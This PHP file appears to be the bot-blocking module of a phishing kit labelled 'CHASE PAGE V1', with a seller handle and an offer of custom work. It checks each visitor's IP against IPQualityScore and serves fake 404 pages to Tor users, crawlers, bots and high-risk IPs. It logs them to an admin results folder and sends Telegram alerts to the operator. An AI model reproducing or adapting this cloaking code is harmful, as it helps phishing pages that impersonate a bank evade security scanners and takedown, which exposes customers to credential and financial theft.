<?php
error_reporting(0);
include 'telegram.php';
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
// Fetch The Result
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.ipqualityscore.com/api/json/ip/".$ipqualityscore_key."/".$ip."");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);
$json = curl_exec($curl);
curl_close($curl);

// Decode the result into an array.
$result = json_decode($json, true);

// Check to see if our query was successful.
if (isset($result['success']) && $result['success'] === true) {
    // We'd like to block only visitors with a fraud score over 80.
    if ($result['fraud_score'] >= 80) {
         $content1 = "#> ".$ip." [ Fraud score ] \r\n";
         $save1=fopen("admin/result/bot.txt","a+");
         fwrite($save1,$content1);
         fclose($save1);
         header("HTTP/1.0 404 Not Found");exit();
    }

    // We'd like to block only visitors which are using tor.
    if ($result['tor'] === true) {
         $content2 = "#> ".$ip." [ Tor ] \r\n";
         $save2=fopen("admin/result/bot.txt","a+");
         fwrite($save2,$content2);
         fclose($save2);
         header("HTTP/1.0 404 Not Found");exit();
    }

    // We'd like to block Web crawler.
    if ($result['is_crawler'] === true) {
         $content3 = "#> ".$ip." [ Web Crawler ] \r\n";
         $save3=fopen("admin/result/bot.txt","a+");
         fwrite($save3,$content3);
         fclose($save3);
         header("HTTP/1.0 404 Not Found");exit();
    }

    // We'd like to block Bots.
    if ($result['bot_status'] === true) {
         $content4 = "#> ".$ip." [ Bot ] \r\n";
         $save4=fopen("admin/result/bot.txt","a+");
         fwrite($save4,$content4);
         fclose($save4);
         header("HTTP/1.0 404 Not Found");exit();
    }

    /*
     * If you are confused with these code or simply have a use case
     * not covered here, please feel free to contact Me @Zroxo
     * team. We'll craft a custom piece of code to meet your requirements.
    */

}
else
{

    /*
     * Will Send you message to your telegram if something wrong :)
    */

    $message = "You have problem on Ipqualityscore please change the api key now or contact me @zroxo 😓";
    telegram_message($message, $telegram_token, $telegram_chatid);
}

?>
